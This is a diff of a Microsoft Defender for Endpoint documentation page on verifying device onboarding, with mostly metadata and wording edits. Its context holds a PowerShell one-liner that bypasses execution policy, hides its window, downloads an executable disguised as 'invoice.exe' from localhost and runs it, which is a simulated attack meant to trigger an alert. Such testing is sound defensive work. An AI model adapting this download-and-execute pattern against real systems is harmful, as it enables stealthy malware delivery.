@@ -13,7 +13,7 @@ manager: dansimp
 audience: ITPro
 ms.collection:
   - m365-security-compliance
-  - m365initiative-defender-endpoint
+  - m365-initiative-defender-endpoint
 ms.topic: article
 ms.technology: mde
 ---
@@ -31,7 +31,7 @@ ms.technology: mde
 - Windows Server, version 1803
 - Windows Server 2019
 - Windows Server 2022
-- [Microsoft Defender for Endpoint](https://go.microsoft.com/fwlink/?linkid=2154037)
+- [Microsoft Defender for Endpoint Plan 2](https://go.microsoft.com/fwlink/?linkid=2154037)
 - [Microsoft 365 Defender](https://go.microsoft.com/fwlink/?linkid=2118804)
 
 > Want to experience Microsoft Defender for Endpoint? [Sign up for a free trial.](https://signup.microsoft.com/create-account/signup?products=7f379fee-c4f9-4278-b0a1-e4c8c2fcdf7e&ru=https://aka.ms/MDEp2OpenTrial?ocid=docs-wdatp-exposedapis-abovefoldlink)
@@ -51,15 +51,15 @@ Run the following PowerShell script on a newly onboarded device to verify that i
 
    1. Right-click **Command Prompt** and select **Run as administrator**.
 
-      ![Window Start menu pointing to Run as administrator.](images/run-as-admin.png)
-
+      :::image type="content" source="images/run-as-admin.png" alt-text="The Start menu pointing to Run as administrator" lightbox="images/run-as-admin.png":::
+    
 3. At the prompt, copy and run the following command:
 
    ```powershell
    powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe');Start-Process 'C:\\test-MDATP-test\\invoice.exe'
    ```
 
-The Command Prompt window will close automatically. If successful, the detection test will be marked as completed and a new alert will appear in the portal for the onboarded device in about 10 minutes.
+The Command Prompt window will close automatically. If successful, a new alert will appear in the portal for the onboarded device in about ten minutes.
 
 ## Related topics
 
